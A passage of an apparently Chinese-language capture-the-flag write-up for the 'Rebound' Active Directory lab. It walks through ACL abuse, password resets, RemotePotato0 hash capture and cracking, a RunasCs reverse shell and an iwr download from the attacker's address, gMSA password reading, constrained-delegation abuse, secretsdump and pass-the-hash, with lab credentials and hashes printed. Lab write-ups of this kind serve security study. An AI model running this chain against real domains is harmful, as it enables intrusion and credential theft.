<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/getTGT.py rebound.htb/ldap_monitor:'1GR8t@$$4u'</span><br><span class="line">export KRB5CCNAME=./ldap_monitor.ccache</span><br><span class="line">faketime -f +7h python3 powerview.py rebound.htb/ldap_monitor@10.10.11.231 -k --no-pass --dc-ip 10.10.11.231 --use-ldaps</span><br><span class="line"></span><br><span class="line">PV &gt; Get-ObjectAcl -Identity SERVICEMGMT</span><br><span class="line"></span><br><span class="line">ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb</span><br><span class="line">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : None</span><br><span class="line">ActiveDirectoryRights       : Self</span><br><span class="line">Access mask                 : 0x8</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091118.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>oorend可以把自己加到SERVICEMGMT里：</p>
<ul>
<li>CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework<br><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">https://github.com/CravateRouge/bloodyAD</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"</span><br></pre></td></tr></table></figure>

<h2 id="SERVICEMGMT-gt-winrm-svc"><a href="#SERVICEMGMT-gt-winrm-svc" class="headerlink" title="SERVICEMGMT -&gt; winrm_svc"></a>SERVICEMGMT -&gt; winrm_svc</h2><p>SERVICEMGMT对SERVICE USERS有GenericAll权限，winrm_svc在这个组里，那就可以直接改密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091108.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>这个分支实现有dacledit：</p>
<ul>
<li>ThePorgs/impacket: Impacket is a collection of Python classes for working with network protocols.<br><a href="https://github.com/ThePorgs/impacket" target="_blank" rel="noopener">https://github.com/ThePorgs/impacket</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pipenv shell</span><br><span class="line">git clone https://github.com/ThePorgs/impacket/</span><br><span class="line">cd impacket</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 setup.py install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加组和后面连续快速操作</span></span><br><span class="line">bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取TGT</span></span><br><span class="line">python3 getTGT.py rebound.htb/oorend:'1GR8t@$$4u'</span><br><span class="line">export KRB5CCNAME=oorend.ccache</span><br><span class="line"><span class="meta">#</span><span class="bash"> 给予修改密码的权限</span></span><br><span class="line">python3 dacledit.py rebound.htb/oorend:'1GR8t@$$4u' -dc-ip 10.10.11.231 -k -use-ldaps -principal "oorend" -action write -rights ResetPassword -target-dn "OU=SERVICE USERS,DC=REBOUND,DC=HTB" -debug -inheritance</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改winrm_svc密码</span></span><br><span class="line">net rpc password winrm_svc -U 'rebound.htb/oorend%1GR8t@$$4u' -S rebound.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091109.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091110.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>修改winrm_svc密码后就可以通过winrm登录，操作要快，因为winrm_svc用户本身会定期几分钟修改一次密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u winrm_svc -i 10.10.11.231</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091111.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h1><p>为什么要用这个，问就是队友给的(或者自己各种枚举分析，试行错误)</p>
<ul>
<li>ntonioCoco/RemotePotato0: Windows Privilege Escalation from User to Domain Admin.<br><a href="https://github.com/antonioCoco/RemotePotato0" target="_blank" rel="noopener">https://github.com/antonioCoco/RemotePotato0</a></li>
</ul>
<p>例如枚举发现tbrady的session id是1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;query user</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line"> tbrady                console             1  Active      none   9/11/2023 1:34 PM</span><br></pre></td></tr></table></figure>

<p>它滥用 DCOM 激活服务并触发当前登录目标计算机的任何用户的 NTLM 身份验证。要求特权用户登录同一台计算机（例如域管理员用户）。一旦 NTLM type1 被触发，我们就会设置一个跨协议中继服务器，该服务器接收特权 type1 消息，并通过解包 RPC 协议并通过 HTTP 打包身份验证将其中继到第三个资源。在接收端，您可以设置另一个中继节点（例如 ntlmrelayx）或直接中继到特权资源。RemotePotato0 还允许抓取和窃取登录计算机的每个用户的 NTLMv2 哈希值。</p>
<p>所以可以抓到其他登录用户的hash，这里抓到了tbrady用户NTLMv2  hash：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 &amp;&amp; sudo python3 ~/Tools/impacket/examples/ntlmrelayx.py -t ldap://10.10.11.231 --no-wcf-server --escalate-user winrm_svc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">.\RemotePotato0.exe -m 2 -r 10.10.16.4 -x 10.10.16.4 -p 9999 -s 1</span><br><span class="line"></span><br><span class="line">NTLMv2 Client	: DC01</span><br><span class="line">NTLMv2 Username	: rebound\tbrady</span><br><span class="line">NTLMv2 Hash	: tbrady::rebound:cd376f04d9b56320:6ba1f7ea846dd8318569123d9359bee0:0101000000000000dd71fe89f4e4d9012bc3e898c11b79dd0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800dd71fe89f4e4d90106000400060000000800300030000000000000000100000000200000fb339e7ac3018ce371fcef4765ae238ad6560f4c951c682e798c61f1b74796be0a00100000000000000000000000000000000000090000000000000000000000</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091112.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="tbrady"><a href="#tbrady" class="headerlink" title="tbrady"></a>tbrady</h2><p>破解出来密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">543BOMBOMBUNmanda (tbrady)</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091113.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="GMSA"><a href="#GMSA" class="headerlink" title="GMSA"></a>GMSA</h1><p>根据bloodhound结果，tbrady可以读取DELEGATOR的GMSA密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091114.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p> tbrady不能直接连接，从winrm_svc那里弹个shell出来：</p>
<ul>
<li>antonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exe<br><a href="https://github.com/antonioCoco/RunasCs" target="_blank" rel="noopener">https://github.com/antonioCoco/RunasCs</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe tbrady 543BOMBOMBUNmanda cmd.exe -r 10.10.16.4:4444</span><br></pre></td></tr></table></figure>

<p>需要用的exe可以自己编译，也可以直接用编译好的：</p>
<ul>
<li>rvazarkar/GMSAPasswordReader<br><a href="https://github.com/rvazarkar/GMSAPasswordReader" target="_blank" rel="noopener">https://github.com/rvazarkar/GMSAPasswordReader</a></li>
<li>Toolies/GMSAPasswordReader.exe at master · expl0itabl3/Toolies<br><a href="https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe" target="_blank" rel="noopener">https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe</a></li>
<li>OffensivePythonPipeline/binaries/gMSADumper_windows.exe at main · Qazeer/OffensivePythonPipeline<br><a href="https://github.com/Qazeer/OffensivePythonPipeline/blob/main/binaries/gMSADumper_windows.exe" target="_blank" rel="noopener">https://github.com/Qazeer/OffensivePythonPipeline/blob/main/binaries/gMSADumper_windows.exe</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c "iwr http://10.10.16.4:7777/GMSAPasswordReader.exe -outfile gmsa.exe"</span><br><span class="line"></span><br><span class="line">C:\temp&gt;gmsa.exe --accountname delegator$</span><br><span class="line">gmsa.exe --accountname delegator$</span><br><span class="line">Calculating hashes for Old Value</span><br><span class="line">[*] Input username             : delegator$</span><br><span class="line">[*] Input domain               : REBOUND.HTB</span><br><span class="line">[*] Salt                       : REBOUND.HTBdelegator$</span><br><span class="line">[*]       rc4_hmac             : B8EE5490AD4BAFE753FEC009F1105817</span><br><span class="line">[*]       aes128_cts_hmac_sha1 : 6CDAE5ECCDF096616A16B36BF10C80CF</span><br><span class="line">[*]       aes256_cts_hmac_sha1 : BD5983A384D2FA0F43CC0C4775DEF12414DF235E1A9B5053F1FDC0ECA325D9B3</span><br><span class="line">[*]       des_cbc_md5          : 85D6DF1ADCC731A1</span><br><span class="line"></span><br><span class="line">Calculating hashes for Current Value</span><br><span class="line">[*] Input username             : delegator$</span><br><span class="line">[*] Input domain               : REBOUND.HTB</span><br><span class="line">[*] Salt                       : REBOUND.HTBdelegator$</span><br><span class="line">[*]       rc4_hmac             : 9B0CCB7D34C670B2A9C81C45BC8BEFC3</span><br><span class="line">[*]       aes128_cts_hmac_sha1 : DFAADA2566F98168071386B8AB83806C</span><br><span class="line">[*]       aes256_cts_hmac_sha1 : 3D9FD157B4D18C641E7DDA0D8997AF92AD4832C823BEF1238D6D54A5D147DA92</span><br><span class="line">[*]       des_cbc_md5          : 7A58673EE3DA67B0</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091115.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>也可以远程获取，同步时间即可,几种不同的方式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">brew install libfaketime --build-from-source</span><br><span class="line"><span class="meta">#</span><span class="bash"> 根据具体时差调整</span></span><br><span class="line">faketime -f +7h poetry run crackmapexec ldap dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa</span><br><span class="line"></span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        dc01.rebound.htb 636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda</span><br><span class="line">LDAP        dc01.rebound.htb 636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAP        dc01.rebound.htb 636    DC01             Account: delegator$           NTLM: 9b0ccb7d34c670b2a9c81c45bc8befc3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bloodyAD -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: IOCJT/tYf2VGNZVrkcIZv2aLwO+6Ehw/7l7W8qzd809vkDqv2wFGs1cHaR6S9fLT3qo1SupEZbSz2V/yS+CKJDLUSVWpTSKFrogU1K5JUonhbMHPAzduYOJJr9LpgRbyGA7juR3ZyqWQz9nJnqlK6A/FcrVT92BlPdLPggRj5IAHn7GstcyTpSl+AM398LfI9P7o+ffdhg2sxk6HSrlXcQG5U1DdQCKCuKSfxhP+SZ/ztoykdM5DfWWN/yTfw0SAoiBI0TBVLZI6JFDqipbcmbOP4+ktCXIBwyRz9PGmbf2lu+9VZuw0mKR7jC3AlxgrBK2BUgm1O7yk/vwTqsL8TA==</span><br></pre></td></tr></table></figure>



<h1 id="DELEGATOR"><a href="#DELEGATOR" class="headerlink" title="DELEGATOR"></a>DELEGATOR</h1><p>继续回到BloodHound，DELEGATOR允许委派<code>http/dc01.rebound.htb</code>:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091116.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>根据前面的只允许kerberos认证，搜索，参考,主要是KCD-&gt;self-rbcd：</p>
<ul>
<li>Abusing Kerberos Constrained Delegation without Protocol Transition | snovvcrash@gh-pages:~$ _<br><a href="https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html" target="_blank" rel="noopener">https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html</a></li>
<li>(KCD) Constrained - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</a></li>
<li>(RBCD) Resource-based constrained - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></li>
<li>Resource-Based Constrained Delegation Abuse<br><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/" target="_blank" rel="noopener">https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/</a></li>
</ul>
<p>这里两种方式，一种是通过ntlm获取TGT，一种是使用aes key，但这个aes key和前面gmsa exe得到的是不同的(最终secretsdump可以得到这个正确的aeskey)，根据其他人讨论是通过gMSADumper Python脚本得到的，自己用这个脚本有问题就暂时跳过了，NTLM TGT方式没问题：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">unset KRB5CCNAME</span><br><span class="line"><span class="meta">#</span><span class="bash"> NTLM TGT方式</span></span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes :9b0ccb7d34c670b2a9c81c45bc8befc3</span><br><span class="line">export KRB5CCNAME=./delegator\$@dc01.rebound.htb.ccache</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> aes key方式，设置允许ldap_monitor到delegator的委派</span></span><br><span class="line">impacket-rbcd -aesKey 9861cac50c316fadde60e00ec4a3c63852afbe05443343cdb011be5f1d4ddc2b 'rebound.htb/delegator$' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor</span><br><span class="line"><span class="meta">#</span><span class="bash"> NTLM TGT方式，使用上面通过ntlm <span class="built_in">hash</span>得到的delegator$ TGT设置rbcd</span></span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/rbcd.py -k -no-pass 'rebound.htb/delegator$' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后获取ldap_monitor的TGT</span></span><br><span class="line">impacket-getTGT 'rebound.htb/ldap_monitor:1GR8t@$$4u'</span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/getTGT.py rebound.htb/ldap_monitor:'1GR8t@$$4u'</span><br><span class="line">export KRB5CCNAME=ldap_monitor.ccache</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取ST，bloodhound里可以看到spn是browser/dc01.rebound.htb</span></span><br><span class="line">impacket-getST -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass</span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass</span><br><span class="line">export KRB5CCNAME=dc01\$.ccache</span><br><span class="line"><span class="meta">#</span><span class="bash"> 上一步得到的TGS是可转发的，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -additional-ticket参数描述 ： 在仅用于 RBCD + KCD Kerberos 的 S4U2Proxy 请求中包含可转发的服务票据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> aes key方式</span></span><br><span class="line">impacket-getST -spn 'http/dc01.rebound.htb' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' 'rebound.htb/delegator$' -aesKey 9861cac50c316fadde60e00ec4a3c63852afbe05443343cdb011be5f1d4ddc2b -k -no-pass</span><br><span class="line"><span class="meta">#</span><span class="bash"> NTLM TGT方式，还是使用上面通过ntlm <span class="built_in">hash</span>得到的delegator$ TGT</span></span><br><span class="line">export KRB5CCNAME=./delegator\$@dc01.rebound.htb.ccache</span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/getST.py -spn 'http/dc01.rebound.htb' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' 'rebound.htb/delegator$' -k -no-pass</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 模拟了dc01机器账户，现在可以secretsdump</span></span><br><span class="line">export KRB5CCNAME=./dc01\$.ccache</span><br><span class="line">impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm</span><br><span class="line">faketime -f +7h python3 ~/Tools/impacket/examples/secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm</span><br></pre></td></tr></table></figure>

<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::</span><br><span class="line">ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::</span><br><span class="line">llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::</span><br><span class="line">fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::</span><br><span class="line">jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::</span><br><span class="line">mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::</span><br><span class="line">nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::</span><br><span class="line">ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::</span><br><span class="line">oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::</span><br><span class="line">winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::</span><br><span class="line">batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::</span><br><span class="line">tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::</span><br><span class="line"><span class="meta">DC01$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::</span></span><br><span class="line"><span class="meta">delegator$</span><span class="bash">:7687:aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3:::</span></span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>



<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>secretsdump得到域管hash，登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :176be138594933bb67db3b2572fc91b8 rebound.htb/administrator@dc01.rebound.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091117.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>Enumerate users by bruteforcing RID - CrackMapExec ~ CME WIKI<br><a href="https://www.crackmapexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid" target="_blank" rel="noopener">https://www.crackmapexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid</a></li>
<li>GhostPack/Rubeus: Trying to tame the three-headed dog.<br><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></li>
<li>Kerberoast - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/kerberoast</a></li>
<li>Support for Kerberoasting without pre-authentication and ST request through AS-REQ by ShutdownRepo · Pull Request #1413 · fortra/impacket<br><a href="https://github.com/fortra/impacket/pull/1413" target="_blank" rel="noopener">https://github.com/fortra/impacket/pull/1413</a></li>
<li>p0dalirius/LDAPmonitor: Monitor creation, deletion and changes to LDAP objects live during your pentest or system administration!<br><a href="https://github.com/p0dalirius/LDAPmonitor" target="_blank" rel="noopener">https://github.com/p0dalirius/LDAPmonitor</a></li>
<li>dirkjanm/BloodHound.py: A Python based ingestor for BloodHound<br><a href="https://github.com/dirkjanm/BloodHound.py" target="_blank" rel="noopener">https://github.com/dirkjanm/BloodHound.py</a></li>
<li>ThePorgs/impacket: Impacket is a collection of Python classes for working with network protocols.<br><a href="https://github.com/ThePorgs/impacket" target="_blank" rel="noopener">https://github.com/ThePorgs/impacket</a></li>
<li>aniqfakhrul/powerview.py: Just another Powerview alternative<br><a href="https://github.com/aniqfakhrul/powerview.py" target="_blank" rel="noopener">https://github.com/aniqfakhrul/powerview.py</a></li>
<li>Self Exploit - Undergrad CyberSec Notes<br><a href="https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self" target="_blank" rel="noopener">https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self</a></li>
<li>CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework<br><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">https://github.com/CravateRouge/bloodyAD</a></li>
<li>antonioCoco/RemotePotato0: Windows Privilege Escalation from User to Domain Admin.<br><a href="https://github.com/antonioCoco/RemotePotato0" target="_blank" rel="noopener">https://github.com/antonioCoco/RemotePotato0</a></li>
<li>antonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exe<br><a href="https://github.com/antonioCoco/RunasCs" target="_blank" rel="noopener">https://github.com/antonioCoco/RunasCs</a></li>
<li>rvazarkar/GMSAPasswordReader<br><a href="https://github.com/rvazarkar/GMSAPasswordReader" target="_blank" rel="noopener">https://github.com/rvazarkar/GMSAPasswordReader</a></li>
<li>Toolies/GMSAPasswordReader.exe at master · expl0itabl3/Toolies<br><a href="https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe" target="_blank" rel="noopener">https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe</a></li>
<li>Abusing Kerberos Constrained Delegation without Protocol Transition | snovvcrash@gh-pages:~$ _<br><a href="https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html" target="_blank" rel="noopener">https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html</a></li>
<li>(KCD) Constrained - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</a></li>
<li>(RBCD) Resource-based constrained - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></li>
